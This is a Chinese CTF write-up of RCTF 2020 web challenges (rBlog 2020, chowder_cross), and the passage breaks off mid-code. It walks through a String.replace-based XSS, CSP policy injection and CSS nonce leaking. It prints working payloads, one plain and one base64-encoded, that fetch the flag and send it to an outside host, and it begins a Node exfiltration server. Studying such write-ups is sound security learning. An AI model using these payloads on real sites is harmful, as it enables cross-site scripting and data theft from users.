class="line">            &#125; <span class="keyword">catch</span> (\Throwable $e) &#123;</span><br><span class="line">                var_dump($code);</span><br><span class="line">                var_dump($e-&gt;getMessage());</span><br><span class="line">                <span class="comment">// do nothing</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $response-&gt;end(<span class="string">'Done'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $response-&gt;sendfile(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$http-&gt;start();</span><br></pre></td></tr></table></figure>

<p>网页的源码只有这么些，很明显有一个可利用的点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; unserialize($code);</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>

<p>（这题我看了wp都做不出来，wtcl，等我看懂了再补上，咕咕咕</p>
<h3 id="rBlog-2020"><a href="#rBlog-2020" class="headerlink" title="rBlog 2020"></a>rBlog 2020</h3><p>hint:</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvU3RyaW5nL3JlcGxhY2U=">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace<i class="fa fa-external-link-alt"></i></span></p>
<p>贴上英文的writeup:</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNhbDEuY24vcG9zdC9SQ1RGJTIwMjAyMCUyMHJCbG9nJTIwd3JpdGV1cA==">https://blog.cal1.cn/post/RCTF%202020%20rBlog%20writeup<i class="fa fa-external-link-alt"></i></span></p>
<p>先看CSP:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39; data:; object-src &#39;none&#39;; base-uri &#39;none&#39;;</span><br></pre></td></tr></table></figure>

<ul>
<li>有 <code>unsafe-inline</code> 和 <code>unsafe-eval</code>，可以说啥都能用了</li>
</ul>
<p>然后下载源码，发现是 <code>django</code> 框架</p>
<ul>
<li><p>主路由 <code>rblog4</code> 分为两个分路由 <code>users</code>和 <code>posts</code></p>
</li>
<li><p>查看 <code>users</code> 的路由，发现没有用户注册功能，所以这个登录和注销功能只有 <code>bot</code> 能用，也不用看了</p>
</li>
</ul>
<p>主要看 <code>posts</code> 的路由和源码</p>
<p><code>posts/urls.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app_name = <span class="string">'posts'</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'&lt;uuid:id&gt;'</span>, post_id_handler, name=<span class="string">'uuid'</span>),</span><br><span class="line">    path(<span class="string">''</span>, post_list_handler, name=<span class="string">'list'</span>),</span><br><span class="line">    path(<span class="string">'feedback'</span>, feedback_handler, name=<span class="string">'feedback'</span>),</span><br><span class="line">    path(<span class="string">'flag'</span>, flag_handler)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>posts/views.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Post, Feedback</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_id_handler</span><span class="params">(req, id)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'fetch'</span> <span class="keyword">in</span> req.GET:</span><br><span class="line">        p = Post.objects.filter(id=id)</span><br><span class="line">        <span class="keyword">if</span> len(p) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(p.values(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'content'</span>, <span class="string">'create_at'</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> HttpResponse(status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render(req, <span class="string">'posts/post.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_list_handler</span><span class="params">(req)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'fetch'</span> <span class="keyword">in</span> req.GET:</span><br><span class="line">        post_list = Post.objects.order_by(<span class="string">'-create_at'</span>)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(list(post_list.values(<span class="string">'id'</span>, <span class="string">'title'</span>)), safe=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render(req, <span class="string">'posts/list.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">feedback_handler</span><span class="params">(req)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> req.method == <span class="string">'POST'</span>:</span><br><span class="line">        fb = &#123;</span><br><span class="line">            <span class="string">'link'</span>: req.POST.get(<span class="string">'postid'</span>, <span class="string">''</span>),</span><br><span class="line">            <span class="string">'highlight_word'</span>: req.POST.get(<span class="string">'highlight'</span>, <span class="string">''</span>),</span><br><span class="line">            <span class="string">'ip'</span>: req.META.get(<span class="string">'HTTP_X_REAL_IP'</span>, req.META.get(<span class="string">'REMOTE_ADDR'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        last_fb = Feedback.objects.filter(ip=fb[<span class="string">'ip'</span>]).order_by(<span class="string">'-create_at'</span>).first()</span><br><span class="line">        <span class="comment"># check if last feedback from is ip is within one minute</span></span><br><span class="line">        <span class="keyword">if</span> last_fb <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> last_fb <span class="keyword">and</span> (datetime.now() - last_fb.create_at) &gt; timedelta(minutes=<span class="number">1</span>):</span><br><span class="line">            wew = Feedback(**fb)</span><br><span class="line">            wew.save()</span><br><span class="line">            <span class="keyword">return</span> HttpResponse(status=<span class="number">204</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> HttpResponse(status=<span class="number">429</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fetch'</span> <span class="keyword">in</span> req.GET:</span><br><span class="line">            <span class="keyword">if</span> req.user.is_staff:</span><br><span class="line">                fb = Feedback.objects.filter(is_viewed=<span class="literal">False</span>).order_by(<span class="string">'create_at'</span>)[:<span class="number">5</span>]</span><br><span class="line">                ret = list(fb.values(<span class="string">'link'</span>, <span class="string">'highlight_word'</span>, <span class="string">'ip'</span>))</span><br><span class="line">                Feedback.objects.filter(pk__in=fb.values_list(<span class="string">'pk'</span>)).update(is_viewed=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(ret, safe=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> HttpResponse(status=<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render(req, <span class="string">'posts/feedback.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag_handler</span><span class="params">(req)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> req.user.is_staff:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(getenv(<span class="string">'CHALLENGE_FLAG'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(status=<span class="number">401</span>)</span><br></pre></td></tr></table></figure>

<p>这里我们可以得到以下信息</p>
<ul>
<li><p><code>flag</code> 位于 <code>/posts/flag</code> ，需要 <code>bot</code> 访问</p>
</li>
<li><p><code>feedback</code> 中我们通过 <code>POST</code> 来提交信息，如下</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/posts/feedback</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: rblog.rctf2020.rois.io</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">postid=8dfaa99d-da9b-4e90-954e-0f97a6917b91&amp;highlight=writeup</span><br></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">postid &#x3D;&gt; link</span><br><span class="line">highlight_word &#x3D;&gt; highlight</span><br></pre></td></tr></table></figure>

<p><code>bot</code> 访问时会返回渲染页面 <code>posts/feedback.html</code></p>
</li>
</ul>
<p>然后分析下 <code>feedback.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Feedback list<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"feedback_list"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line">&#123;% block script %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static "</span><span class="attr">js</span>/<span class="attr">purify.min.js</span>" %&#125;"&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    axios.get(<span class="string">'?fetch'</span>).then(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> resp.data) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> params = <span class="keyword">new</span> URLSearchParams()</span></span><br><span class="line"><span class="actionscript">            params.set(<span class="string">'highlight'</span>, i.highlight_word)</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (i.link.includes(<span class="string">'/'</span>) || i.link.includes(<span class="string">'\\'</span>)) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">continue</span>; <span class="comment">// bye bye hackers uwu</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span></span><br><span class="line"><span class="javascript">            a.href = <span class="string">`<span class="subst">$&#123;i.link&#125;</span>?<span class="subst">$&#123;params.toString()&#125;</span>`</span></span></span><br><span class="line"><span class="javascript">            a.text = <span class="string">`<span class="subst">$&#123;i.ip&#125;</span>: <span class="subst">$&#123;a.href&#125;</span>`</span></span></span><br><span class="line">            feedback_list.appendChild(a)</span><br><span class="line"><span class="javascript">            feedback_list.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'br'</span>))</span></span><br><span class="line">        &#125;</span><br><span class="line">        feedback_list.innerHTML = DOMPurify.sanitize(feedback_list.innerHTML)</span><br><span class="line">    &#125;, err =&gt; &#123;</span><br><span class="line">        feedback_list.innerText = err</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>管理员访问 <code>/posts/feedback</code> 时，会从服务器获取我们 <code>POST</code> 的信息，构造如下标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"8dfaa99d-da9b-4e90-954e-0f97a6917b91?highlight=writeup"</span>&gt;</span>ip: a.href<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>link</code> ，也就是我们提交的 <code>postid</code> 检测了 <code>/</code> 和 <code>\</code></p>
</li>
</ul>
<p>这里我们会想到用 <code>javascript:</code> 来构造xss语句，但是被 <code>DOMPurify</code> 净化了，所以没法使用</p>
<p>跟着url路由，我们来到 <code>posts/post.html</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> postid = location.pathname.split(<span class="string">'/'</span>, <span class="number">3</span>)[<span class="number">2</span>];</span><br><span class="line">axios.get(<span class="string">'?fetch'</span>).then(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> p = resp.data</span><br><span class="line">    <span class="built_in">document</span>.title = p.title</span><br><span class="line">    post_title.innerText = p.title</span><br><span class="line">    post_time.innerText = p.create_at</span><br><span class="line">    post_content.innerHTML = DOMPurify.sanitize(p.content)</span><br><span class="line">    highlight_word()</span><br><span class="line">&#125;, err =&gt; &#123;</span><br><span class="line">    post_title.innerHTML = err</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">highlight_word</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    u = <span class="keyword">new</span> URL(location)</span><br><span class="line">    hl = u.searchParams.get(<span class="string">'highlight'</span>) || <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> (hl) &#123;</span><br><span class="line">        <span class="comment">// ban html tags</span></span><br><span class="line">        <span class="keyword">if</span> (hl.includes(<span class="string">'&lt;'</span>) || hl.includes(<span class="string">'&gt;'</span>) || hl.length &gt; <span class="number">36</span>) &#123;</span><br><span class="line">            u.searchParams.delete(<span class="string">'highlight'</span>)</span><br><span class="line">            history.replaceState(<span class="string">''</span>, <span class="string">''</span>, u.href)</span><br><span class="line">            alert(<span class="string">'⚠️ illegal highlight word'</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// why the heck this only highlights the first occurrence? stupid javascript 😠</span></span><br><span class="line">            <span class="comment">// content.innerHTML = content.innerHTML.replace(hl, `&lt;b class="hl"&gt;$&#123;hl&#125;&lt;/b&gt;`)</span></span><br><span class="line">            hl_all = <span class="keyword">new</span> <span class="built_in">RegExp</span>(hl, <span class="string">'g'</span>)</span><br><span class="line">            replacement = <span class="string">`&lt;b class="hl"&gt;<span class="subst">$&#123;hl&#125;</span>&lt;/b&gt;`</span></span><br><span class="line">            post_content.innerHTML = post_content.innerHTML.replace(hl_all, replacement)</span><br><span class="line">            <span class="keyword">let</span> b = <span class="built_in">document</span>.querySelector(<span class="string">'b[class=hl]'</span>)</span><br><span class="line">            <span class="keyword">if</span> (b) &#123;</span><br><span class="line">                <span class="keyword">typeof</span> b.scrollIntoViewIfNeeded === <span class="string">"function"</span> ? b.scrollIntoViewIfNeeded() : b.scrollIntoView()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里进来就是用postid来获取文章信息并显示，因为我们没有账号，文章信息不可控，所以直接看 <code>highlight_word()</code></p>
<ul>
<li>将 <code>highlight</code> 参数传入 <code>hl</code></li>
<li>检测尖括号 <code>&lt;</code> <code>&gt;</code>，限制长度为36</li>
<li>正则匹配 <code>/${hl}/g</code> 替换为 <code>&lt;b class=&quot;hl&quot;&gt;${hl}&lt;/b&gt;</code></li>
</ul>
<p>根据hint，我们可以找到这个东西 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#使用字符串作为参数" target="_blank" rel="noopener"><code>使用字符串作为参数</code></a></p>
<p><img src="https://i.loli.net/2020/06/03/POs2j1WuKekUVxq.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/06/03/rCx6GHEFV1T7bKf.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">匹配第一个：</span><br><span class="line"> 一 二 三         $&#96; &#x3D;&gt; &quot;&quot;         $&#39; &#x3D;&gt; &quot;一二三&quot; </span><br><span class="line">^                1$&#96;2$&#39;3|  &#x3D;&gt;  &quot;12一二三3|&quot;</span><br><span class="line">匹配第二个：</span><br><span class="line"> 一 二 三         $&#96; &#x3D;&gt; &quot;一&quot;       $&#39; &#x3D;&gt; &quot;二三&quot;</span><br><span class="line">   ^             1$&#96;2$&#39;3|  &#x3D;&gt;  &quot;1一2二三3|&quot;</span><br><span class="line">匹配第三个：</span><br><span class="line"> 一 二 三         $&#96; &#x3D;&gt; &quot;一二&quot;      $&#39; &#x3D;&gt; &quot;三&quot;</span><br><span class="line">     ^           1$&#96;2$&#39;3|  &#x3D;&gt;  &quot;1一二2三3|&quot;</span><br><span class="line">匹配第四个：</span><br><span class="line"> 一 二 三         $&#96; &#x3D;&gt; &quot;一二三&quot;    $&#39; &#x3D;&gt; &quot;二三&quot;</span><br><span class="line">        ^        1$&#96;2$&#39;3|  &#x3D;&gt;  &quot;1一二三23|&quot;</span><br><span class="line">拼起来：</span><br><span class="line">&quot;12一二三3|一1一2二三3|二1一二2三3|三1一二三23|&quot;</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?highlight&#x3D;$&#96;style%20onload&#x3D;alert()%0a|</span><br></pre></td></tr></table></figure>

<p>可以弹出窗口，但是因为长度限制为36，所以还得想别的办法</p>
<p>这里大佬用了一种神奇的特性（做笔记</p>
<blockquote>
<p>如果href属性以当前位置加载时使用的其他HTTP协议开头，则不会将其识别为相对URL。</p>
<p><img src="https://i.loli.net/2020/06/03/G1uXHQm5bW83MJA.png" alt="image.png"></p>
</blockquote>
<p>所以我们可以通过让bot访问我们的连接来执行我们的script，然后利用<code>window.name</code>传递我们的payload然后用<code>eval</code>执行</p>
<p>本地 <code>index.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name = <span class="string">"fetch('flag').then(r=&gt;&#123;r.text().then(t=&gt;&#123;location='http://jeffz.cn:6009/'+btoa(t)&#125;)&#125;)"</span></span></span><br><span class="line"><span class="actionscript">location = <span class="string">"https://rblog.rctf2020.rois.io/posts/8dfaa99d-da9b-4e90-954e-0f97a6917b91?highlight=$`style%20onload=eval(top.name)%0a|"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>POST</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/posts/feedback</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: rblog.rctf2020.rois.io</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">postid=http:jeffz.cn:6009&amp;highlight=crzz</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/03/6mNZrsGA4Kc1vbk.png" alt="image.png"></p>
<p>解码得到flag</p>
<blockquote>
<p>RCTF{rblog2015_literally_unplayable_OMEGALUL}</p>
</blockquote>
<p>还有师傅利用了全局变量<code>u</code></p>
<p><code>POST</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/posts/feedback</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: rblog.rctf2020.rois.io</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">postid=8dfaa99d-da9b-4e90-954e-0f97a6917b91?`(eval(atob(`ZmV0Y2goJ2ZsYWcnKS50aGVuKHI9PntyLnRleHQoKS50aGVuKHQ9Pntsb2NhdGlvbj0naHR0cDovL2plZmZ6LmNuOjYwMDkvJytidG9hKHQpfSl9KQ==`)))%3b`%26highlight=$%2560style%2520onload=eval(%2522%2560%2522%252Bu.search)%250A|%26`#&amp;highlight=crzz</span><br></pre></td></tr></table></figure>

<h3 id="chowder-cross"><a href="#chowder-cross" class="headerlink" title="chowder_cross"></a>chowder_cross</h3><blockquote>
<p>hints:</p>
<p>you should bypass the csp at the first of all,try to find the difference from this web challenge’s configuration and other challenge’s configuration,maybe it can help you to bypass the csp.</p>
<p>hint2:You can think about how the .htaccess of this web challenge is written, and think about a strange place in Content-Security-Policy, think about what function I implemented it on the back end of php,and find the relevant csp bypass method,I believe this is helpful for you.</p>
<p>hint3: Try to visit the non-existent page and see what happens, pay attention to img-src to see what happens, please combine my previous hints.</p>
<p>hint4: If you bypass the csp please leak nonce, if you use the best method you will only spend about ten seconds to leak admin’s nonce,don’t think too,I filter more in feedback than post.</p>
<p>hint5: The bot is firefox74.0. And If you are trying leak nonce now and If you think you’re doing the right thing but can’t leak nonce out, I suggest you to find the difference between leak nonce and other values when there is csp.And if you are filtered in the feedback for no reason, it is recommended that you try to add one or more spaces to your payload.I believe these will be of great help to you.</p>
</blockquote>
<p>先贴个英文的writeup : <span class="exturl" data-url="aHR0cHM6Ly9tdXNlbGpoLmdpdGh1Yi5pby8yMDIwLzA2LzAxL1JDVEYyMDIwLWNob3dkZXItY3Jvc3Mtd3JpdGV1cC8=">https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/<i class="fa fa-external-link-alt"></i></span></p>
<p>注册登录，发现又是一道xss题目</p>
<p>随便输入一下，看下csp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;none&#39;;object-src &#39;none&#39;;sandbox allow-scripts;connect-src &#39;self&#39;;script-src &#39;self&#39; https:&#x2F;&#x2F;*.google.com&#x2F;* &#39;nonce-1f73cd3daaa1a2279bedeb7c5299bae1&#39;;img-src http:&#x2F;&#x2F;124.156.139.238&#x2F;;style-src &#39;self&#39; &#39;nonce-1f73cd3daaa1a2279bedeb7c5299bae1&#39;</span><br></pre></td></tr></table></figure>

<p>同时也看到了<code>hint=flag_is_in_flag.php</code></p>
<p>访问<code>/flag.php</code>看到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] === <span class="string">"124.156.139.238"</span> &amp;&amp; $_SERVER[<span class="string">'SERVER_NAME'</span>] === <span class="string">"124.156.139.238"</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"function get_secret()&#123; '"</span>.base64_encode(file_get_contents(<span class="string">'admin.php'</span>)).<span class="string">"' &#125;"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"function get_secret()&#123; 'emmmmm? Why aren\\'t you administrator?'</span></span><br><span class="line"><span class="string">    &#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">'flag.php'</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要让bot来获得 <code>/flag.php?f=1</code> 中的 <code>get_secret</code> 的源码从而获得flag</p>
<p>回来看CSP，其中那个 <code>https://*.google.com/*</code> 和 <code>http://124.156.139.238/</code>令人挺在意的</p>
<p>修改url，发现存在<span class="exturl" data-url="aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvYnlwYXNzaW5nLWNzcC13aXRoLXBvbGljeS1pbmplY3Rpb24=">CSP策略注入<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/06/02/GYv35ersjV2y8Rd.png" alt="image.png"></p>
<p>但是因为 <code>script-src</code> 已经出现过了，所以我们无法通过CSP注入来绕过，我们只可以修改 <code>style-src</code></p>
<blockquote>
<p>这里有个CSP的总结 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzMDIwOTAxL2FydGljbGUvZGV0YWlscy83OTQ5NDQ0OQ==">https://blog.csdn.net/qq_33020901/article/details/79494449<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>不同指令之间用 <code>;</code> 分隔</li>
<li>同一指令的多个指令值之间用空格分隔</li>
<li>指令值除了 URL 都要用引号包裹</li>
<li>指令如果重复，则以第一个为准</li>
</ul>
</blockquote>
<p>因为bot是firefox74.0，我们可以通过CSS样式表注入来获得管理员的 <code>nonce</code>，从而实现script执行</p>
<blockquote>
<p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMjczMjYuaHRtbA==">https://www.freebuf.com/vuls/227326.html<i class="fa fa-external-link-alt"></i></span></p>
<p> 英文原文：<span class="exturl" data-url="aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tL2Nzcy1kYXRhLWV4ZmlsdHJhdGlvbi1pbi1maXJlZm94LXZpYS1zaW5nbGUtaW5qZWN0aW9uLXBvaW50Lw==">https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/<i class="fa fa-external-link-alt"></i></span></p>
<p> exp：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlY3VyaXR1bS9yZXNlYXJjaC9ibG9iL21hc3Rlci9yMjAyMF9maXJlZm94LWNzcy1kYXRhLWV4ZmlsL2V4cGxvaXQuanM=">https://github.com/securitum/research/blob/master/r2020_firefox-css-data-exfil/exploit.js<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>本地运行node脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> compression = <span class="built_in">require</span>(<span class="string">'compression'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> cssesc = <span class="built_in">require</span>(<span class="string">'cssesc'</span>);</span><br><span class="line"><span class="keyword">const</span> spdy = <span class="built_in">require</span>(<span class="string">'spdy'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.set(<span class="string">'etag'</span>, <span class="literal">false</span>);</span><br><span class="line">app.use(compression());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SESSIONS = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> POLLING_ORIGIN = <span class="string">`https://example.com:3000`</span>;</span><br><span class="line"><span class="keyword">const</span> LEAK_ORIGIN = <span class="string">`https://example.com:3000`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlencode</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">encodeURIComponent</span>(s).replace(<span class="regexp">/'/g</span>, <span class="string">'%27'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createSession</span>(<span class="params">length = <span class="number">150</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> resolves = [];</span><br><span class="line">    <span class="keyword">let</span> promises = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        promises[i] = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolves[i] = resolve);</span><br><span class="line">    &#125;</span><br><span class="line">    resolves[<span class="number">0</span>](<span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123; promises, resolves &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CHARSET = <span class="built_in">Array</span>.from(<span class="string">'1234567890/=+QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>);</span><br><span class="line">app.get(<span class="string">'/polling/:session/:index'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; session, index &#125; = req.params;</span><br><span class="line">    index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">    <span class="keyword">if</span> (index === <span class="number">0</span> || !(session <span class="keyword">in</span> SESSIONS)) &#123;</span><br><span class="line">        SESSIONS[session] = createSession()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/css'</span>);</span><br><span class="line">    res.set(<span class="string">'Cache-Control'</span>, <span class="string">'no-cache'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> knownValue = <span class="keyword">await</span> SESSIONS[session].promises[index];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ret = CHARSET.map(<span class="function"><span class="params">char</span> =&gt;</span> 